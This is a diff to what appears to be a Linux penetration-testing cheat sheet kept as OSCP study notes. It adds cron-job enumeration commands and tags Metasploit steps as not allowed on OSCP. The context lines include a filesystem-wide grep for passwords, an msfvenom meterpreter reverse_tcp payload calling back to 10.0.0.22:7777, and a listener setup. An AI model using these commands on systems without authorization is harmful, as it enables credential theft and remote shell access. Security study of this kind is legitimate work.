@@ -43,6 +43,13 @@ List running processes:
 ps -aux
 ```
 
+List cron jobs:
+```bash
+cat /etc/crontab
+ls -l /etc/cron*
+ls -l /var/spool/cron/crontabs
+```
+
 List open ports:
 ```bash
 netstat -tulpn
@@ -58,11 +65,11 @@ Search for strings in files:
 grep --color=auto -rnw '/' -iIe "PASSW\|PASSWD\|PASSWORD\|PWD\|PASS\|PW" --color=always --exclude-dir={usr,lib,boot,bin,cache} 2>/dev/null
 ```
 
-Upgrade a system shell to meterpreter:
+(NOT-OSCP!) Upgrade a system shell to meterpreter:
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.22 LPORT=7777 -f elf > revshell.bin
 ```
-Setup listener:
+(NOT-OSCP!) Setup listener: 
 ```msfconsole
 use exploit/multi/handler
 ```
